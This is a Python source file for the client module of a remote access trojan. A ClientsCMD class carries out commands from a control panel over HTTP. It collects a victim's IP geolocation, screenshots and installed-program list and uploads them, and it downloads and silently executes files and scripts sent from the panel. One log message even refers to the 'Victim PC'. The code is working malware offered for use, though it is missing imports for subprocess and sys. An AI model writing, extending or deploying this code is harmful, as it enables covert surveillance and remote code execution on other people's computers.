import os, tempfile, shutil, requests, base64
from mss import mss  # Used In Taking Screenshot
from HTTPSocket import HTTPSocket

class ClientsCMD:
    def __init__(self, panelURL, machineID):
        self.panelURL = panelURL
        self.machineID = machineID
        self.C = HTTPSocket(self.panelURL, self.machineID)   # Initiate HTTPSocket Class
        self.tempdir = tempfile.gettempdir()

    def get_device_location(self):
        """
        Function to return GeoIP Latitude & Longitude
        """
        try:
            ip_response = requests.get("https://api.ipify.org", timeout=15)
            ip = ip_response.text.strip()
            geo_request = requests.get("https://get.geojs.io/v1/ip/geo/" + ip + ".json", timeout=15)
            geo_data = geo_request.json()
            
            path = os.path.join(self.tempdir, "Location.txt")
            
            with open(path, "w") as f:
                f.write(f"Accuracy          : {geo_data['accuracy']}         \n")                    
                f.write(f"Public IPv4       : {geo_data['ip']}               \n")                                       
                f.write(f"Latitude          : {geo_data['latitude']}         \n")                    
                f.write(f"Longitude         : {geo_data['longitude']}        \n")                    
                f.write(f"City              : {geo_data['city']}             \n")                    
                f.write(f"Region            : {geo_data['region']}           \n")                    
                f.write(f"Country           : {geo_data['country']}          \n")                    
                f.write(f"Country Code      : {geo_data['country_code']}     \n")                    
                f.write(f"Country Code 3    : {geo_data['country_code3']}    \n")                    
                f.write(f"Continent Code    : {geo_data['continent_code']}   \n")                    
                f.write(f"Timezone          : {geo_data['timezone']}         \n")                    
                f.write(f"Organization      : {geo_data['organization']}     \n")                    
                f.write(f"Organization Name : {geo_data['organization_name']}\n")                    

            publicIP = geo_data['ip']
            latitude = geo_data['latitude']
            longitude = geo_data['longitude']
            
            self.C.Send(f"UpdateLocation|BN|{publicIP}|BN|{latitude}|BN|{longitude}")
            self.C.Upload(path)
            os.remove(path)
            self.C.Log("Succ", "Geo Latitude and Longitude Retrieved Successfully")  
            self.C.Send("CleanCommands") 
        except requests.exceptions.RequestException as e:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "Error retrieving location: " + str(e))
        except Exception as e:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred during location retrieval: " + str(e))              

    def upload_and_execute_file(self, file_url, file_new_name):
        try:
            #Downloading File in Temp
            if not file_new_name:
                file_new_name = file_url.split("/")[-1]
                
            destination_path = os.path.join(self.tempdir, file_new_name)
            self.C.Download(file_url, destination_path)

            #Executing File 
            os.startfile(destination_path) # Use os.startfile for Windows to execute silently

            self.C.Log("Succ", "File is Uploaded and Executed File Successfully")  
            self.C.Send("CleanCommands") 
        except requests.exceptions.RequestException as e:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "Error downloading file: " + str(e))
        except Exception as e:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred during file upload/execution: " + str(e))        

    def show_message_box(self, msg, title, iconType, buttonType):
        """ 
        ButtonType = OkOnly/OkCancel/AbortRetryIgnore/YesNoCancel/YesNO/RetryCancel
        ===========================================================================
        0 = OKOnly
        1 = OKCancel
        2 = AbortRetryIgnore
        3 = YesNoCancel 
        4 = YesNo
        5 = RetryCancel

        IconType = None/Critical/Question/Warning/Information/Asterisk 
        ==============================================================
        16 = Critical - Critical Message icon
        32 = Question - Warning Query icon
        48 = Warning - Warning Message icon
        64 = Information - Information Message icon
        0  = Blank         
        """  
        try:
            
            button_map = {
                "OkOnly": 0,
                "OkCancel": 1,
                "AbortRetryIgnore": 2,
                "YesNoCancel": 3,
                "YesNO": 4,
                "RetryCancel": 5
            }
            buttonNumber = button_map.get(buttonType, 0) # Default to OkOnly

            icon_map = {
                "None": 0,
                "Critical": 16,
                "Question": 32,
                "Warning": 48,
                "Information": 64
            }
            iconNumber = icon_map.get(iconType, 0) # Default to Blank

            vbs_path = os.path.join(self.tempdir, "message.vbs")
            with open(vbs_path, "w") as f:
                f.write("dim message\n")
                f.write(f"message = MsgBox(\"{msg}\", {iconNumber + buttonNumber}, \"{title}\")\n")
                
            os.system(vbs_path) #Executing VBScript    
            os.remove(vbs_path) # Clean up the VBS file

            self.C.Log("Succ", "Message Shown Successfully")  
            self.C.Send("CleanCommands") 
        except Exception as e:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred showing message box: " + str(e))

    def take_screenshot(self):
        """
        When Called, It Saves the screenshot.png in TEMP
        """
        try:       
            filename = base64.b64encode(self.machineID.encode()).decode('utf-8')
            screenshot_path = os.path.join(self.tempdir, f"{filename}.png")

            with mss() as screenshot:
                screenshot.shot(output=screenshot_path)
            self.C.Upload(screenshot_path)
            os.remove(screenshot_path)
            self.C.Send("CleanCommands")
            self.C.Log("Succ", "Screenshot Received Successfully")            
        except Exception as e:
            self.C.Log("Fail", "An unexpected error occurred taking screenshot: " + str(e))

    def get_program_list(self):
        """
        When Called, It Saves the ProgramList.txt in TEMP
        """
        try:
            list_path = os.path.join(self.tempdir, "ProgramList.txt")
            # Using subprocess.run for better control and suppressing console window
            cmd = ["wmic", "product", "get", "name,version", "/format:csv"]
            with open(list_path, "w", encoding="utf-8") as f:
                subprocess.run(cmd, shell=True, stdout=f, creationflags=subprocess.CREATE_NO_WINDOW, text=True, errors='ignore')
            
            self.C.Upload(list_path)
            os.remove(list_path)
            
            self.C.Log("Succ", "Retrieved Installed Program List from Victim PC")
            self.C.Send("CleanCommands")
        except Exception as e:
            self.C.Log("Fail", "An unexpected error occurred getting program list: " + str(e))                    
        
    def execute_script(self, script_type, script_name):
        """
        Takes 3 Params : ScriptType, ScriptCode, ScriptName
        Creates the Script in TEMP Directory, Executes the Script, Atlast Deletes the Scripts  
        """
        try:
            
            # Remove existing extension before adding the correct one
            base_name, _ = os.path.splitext(script_name)
            script_name_with_ext = f"{base_name}.{script_type.lower()}"
            
            script_path = os.path.join(self.tempdir, script_name_with_ext)
            
            # Downloading script in TEMP Directory
            self.C.Download(self.panelURL + "scripts/" + script_name_with_ext, script_path)
            
            # Execute the script based on type
            if script_type.lower() == "py":
                # Use python interpreter to run .py script
                import sysconfig
                python_exe = os.path.join(sysconfig.get_paths()["scripts"], "python.exe")
                if not os.path.exists(python_exe):
                    python_exe = sys.executable # Fallback if python.exe not in Scripts
                subprocess.run([python_exe, script_path], creationflags=subprocess.CREATE_NO_WINDOW, check=False)
            else:
                # For other types (e.g., bat, vbs, exe), use os.startfile
                os.startfile(script_path)

            os.remove(script_path) # Removing Script from TEMP
            
            self.C.Send("DeleteScript|BN|" + script_name_with_ext)
            self.C.Log("Succ", "Executed Script Successfully")
            self.C.Send("CleanCommands")        
        except requests.exceptions.RequestException as e:
            self.C.Log("Fail", "Error downloading script: " + str(e))
        except Exception as e:
            self.C.Log("Fail", "An unexpected error occurred during script execution: " + str(e))
             
    def clear_temp_directory(self):
        """
        When Called, It Cleans the TEMP Directory
        """
        try:
            for file_name in os.listdir(self.tempdir): # Iterate over full path now
                full_path = os.path.join(self.tempdir, file_name)
                # Avoid deleting critical system temporary files like FXSAPIDebugLogFile.txt
                # and PyInstaller's _MEI* folders which might be in use by the running payload
                if file_name != "FXSAPIDebugLogFile.txt" and not file_name.startswith("_MEI"):
                    try:
                        if os.path.isdir(full_path):
                            shutil.rmtree(full_path)
                        else:
                            os.remove(full_path)
                    except Exception: # Catch any error during deletion for best effort cleanup
                        pass 
            self.C.Log("Succ", "TEMP Directory Cleaned Successfully")
            self.C.Send("CleanCommands")         
        except Exception as e:
            self.C.Log("Fail", "An unexpected error occurred during temp directory cleanup: " + str(e))            
                    
    def close_connection(self):
        """
        Sends Offline Command to SERVER 
        """
        try:
            self.C.Send("Offline")
            self.C.Log("Succ", "Connection closed")
            self.C.Send("CleanCommands")            
        except Exception as e:
            self.C.Log("Fail", "An unexpected error occurred closing connection: " + str(e))
